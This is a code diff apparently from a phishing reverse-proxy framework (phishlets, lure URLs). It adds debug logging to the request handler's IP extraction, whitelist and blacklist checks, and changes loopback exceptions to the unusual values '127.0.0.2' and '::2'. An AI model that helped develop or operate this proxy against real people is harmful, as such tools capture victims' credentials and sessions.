@@ -125,13 +125,13 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
-/* 	log.Info("hostname: %s", hostname)
+	log.Info("hostname: %s", hostname)
 	log.Info("port: %d", port)
 	log.Info("cfg: %v", cfg)
 	log.Info("crt_db: %v", crt_db)
 	log.Info("db: %v", db)
 	log.Info("bl: %v", bl)
-	log.Info("developer: %t", developer) */
+	log.Info("developer: %t", developer)
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -181,6 +181,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+			log.Info("[ONREQUEST] START: %s %s from %s", req.Method, req.URL.Path, req.RemoteAddr)
 			ps := &ProxySession{
 				SessionId:    "",
 				Created:      false,
@@ -188,38 +189,48 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				PhishletName: "",
 				Index:        -1,
 			}
+			log.Info("[ONREQUEST] Session created: %+v", ps)
+
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+			log.Info("[ONREQUEST] IP extracted: %s", from_ip)
 
 			// handle proxy headers
 			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
 			for _, h := range proxyHeaders {
 				origin_ip := req.Header.Get(h)
+				log.Info("checking proxy header '%s': %s", h, origin_ip)
 				if origin_ip != "" {
 					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
 					break
 				}
 			}
 
+			log.Info("[ONREQUEST] Final from_ip: %s", from_ip)
+
 			if !p.isIPAllowedByFile(from_ip) {
+				log.Warning("[ONREQUEST] IP BLOCKED by whitelist: %s", from_ip)
 				log.Warning("request from IP '%s' blocked: not in custom whitelist", from_ip)
 				return p.blockRequest(req)
 			}
+			log.Info("[ONREQUEST] IP passed whitelist check")
 
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
 						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
 					}
+					log.Warning("[ONREQUEST] IP BLOCKED by blacklist: %s", from_ip)
 					return p.blockRequest(req)
 				}
 				if p.cfg.GetBlacklistMode() == "all" {
 					if !p.bl.IsWhitelisted(from_ip) {
 						err := p.bl.AddIP(from_ip)
 						if p.bl.IsVerbose() {
+							log.Info("[ONREQUEST] Adding IP to blacklist: %s", from_ip)
 							if err != nil {
 								log.Error("blacklist: %s", err)
 							} else {
@@ -227,11 +238,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 					}
-
+					log.Info("[ONREQUEST] BLACKLIST MODE 'all' - blocking")
 					return p.blockRequest(req)
 				}
 			}
-
+			log.Info("[ONREQUEST] Passed all IP checks, continuing...")
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
 			lure_url := req_url
@@ -905,7 +916,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 			}
-
+			log.Info("[ONREQUEST] END: returning request")
 			return req, nil
 		})
 
@@ -1304,7 +1315,7 @@ func getHomeDir() string {
 }
 
 func (p *HttpProxy) isIPAllowedByFile(ip string) bool {
-	if ip == "127.0.0.2" || ip == "::1" {
+	if ip == "127.0.0.2" || ip == "::2" {
 		return true
 	}
 	customWhitelistMtx.Lock()
